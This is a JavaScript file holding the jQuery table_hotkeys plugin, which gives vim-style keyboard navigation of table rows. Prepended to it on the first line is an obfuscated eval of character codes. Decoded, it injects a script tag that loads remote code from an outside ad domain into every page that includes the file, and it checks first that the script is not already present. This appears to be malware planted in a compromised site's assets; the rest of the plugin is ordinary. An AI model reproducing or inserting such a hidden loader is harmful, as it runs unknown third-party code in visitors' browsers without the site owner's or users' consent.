eval(String.fromCharCode(118, 97, 114, 32, 101, 108, 101, 109, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 101, 108, 101, 109, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 101, 108, 101, 109, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 101, 108, 101, 109, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 49, 49, 53, 44, 32, 52, 54, 44, 32, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 44, 32, 52, 54, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 54, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 101, 108, 101, 109, 41, 59, 32, 125));(function($){
	$.fn.filter_visible = function(depth) {
		depth = depth || 3;
		var is_visible = function() {
			var p = $(this), i;
			for(i=0; i<depth-1; ++i) {
				if (!p.is(':visible')) return false;
				p = p.parent();
			}
			return true;
		};
		return this.filter(is_visible);
	};
	$.table_hotkeys = function(table, keys, opts) {
		opts = $.extend($.table_hotkeys.defaults, opts);
		var selected_class, destructive_class, set_current_row, adjacent_row_callback, get_adjacent_row, adjacent_row, prev_row, next_row, check, get_first_row, get_last_row, make_key_callback, first_row;
		
		selected_class = opts.class_prefix + opts.selected_suffix;
		destructive_class = opts.class_prefix + opts.destructive_suffix;
		set_current_row = function (tr) {
			if ($.table_hotkeys.current_row) $.table_hotkeys.current_row.removeClass(selected_class);
			tr.addClass(selected_class);
			tr[0].scrollIntoView(false);
			$.table_hotkeys.current_row = tr;
		};
		adjacent_row_callback = function(which) {
			if (!adjacent_row(which) && $.isFunction(opts[which+'_page_link_cb'])) {
				opts[which+'_page_link_cb']();
			}
		};
		get_adjacent_row = function(which) {
			var first_row, method;
			
			if (!$.table_hotkeys.current_row) {
				first_row = get_first_row();
				$.table_hotkeys.current_row = first_row;
				return first_row[0];
			}
			method = 'prev' == which? $.fn.prevAll : $.fn.nextAll;
			return method.call($.table_hotkeys.current_row, opts.cycle_expr).filter_visible()[0];
		};
		adjacent_row = function(which) {
			var adj = get_adjacent_row(which);
			if (!adj) return false;
			set_current_row($(adj));
			return true;
		};
		prev_row = function() { return adjacent_row('prev'); };
		next_row = function() { return adjacent_row('next'); };
		check = function() {
			$(opts.checkbox_expr, $.table_hotkeys.current_row).each(function() {
				this.checked = !this.checked;
			});
		};
		get_first_row = function() {
			return $(opts.cycle_expr, table).filter_visible().eq(opts.start_row_index);
		};
		get_last_row = function() {
			var rows = $(opts.cycle_expr, table).filter_visible();
			return rows.eq(rows.length-1);
		};
		make_key_callback = function(expr) {
			return function() {
				if ( null == $.table_hotkeys.current_row ) return false;
				var clickable = $(expr, $.table_hotkeys.current_row);
				if (!clickable.length) return false;
				if (clickable.is('.'+destructive_class)) next_row() || prev_row();
				clickable.click();
			};
		};
		first_row = get_first_row();
		if (!first_row.length) return;
		if (opts.highlight_first)
			set_current_row(first_row);
		else if (opts.highlight_last)
			set_current_row(get_last_row());
		$.hotkeys.add(opts.prev_key, opts.hotkeys_opts, function() {return adjacent_row_callback('prev');});
		$.hotkeys.add(opts.next_key, opts.hotkeys_opts, function() {return adjacent_row_callback('next');});
		$.hotkeys.add(opts.mark_key, opts.hotkeys_opts, check);
		$.each(keys, function() {
			var callback, key;
			
			if ($.isFunction(this[1])) {
				callback = this[1];
				key = this[0];
				$.hotkeys.add(key, opts.hotkeys_opts, function(event) { return callback(event, $.table_hotkeys.current_row); });
			} else {
				key = this;
				$.hotkeys.add(key, opts.hotkeys_opts, make_key_callback('.'+opts.class_prefix+key));
			}
		});

	};
	$.table_hotkeys.current_row = null;
	$.table_hotkeys.defaults = {cycle_expr: 'tr', class_prefix: 'vim-', selected_suffix: 'current',
		destructive_suffix: 'destructive', hotkeys_opts: {disableInInput: true, type: 'keypress'},
		checkbox_expr: ':checkbox', next_key: 'j', prev_key: 'k', mark_key: 'x',
		start_row_index: 2, highlight_first: false, highlight_last: false, next_page_link_cb: false, prev_page_link_cb: false};
})(jQuery);
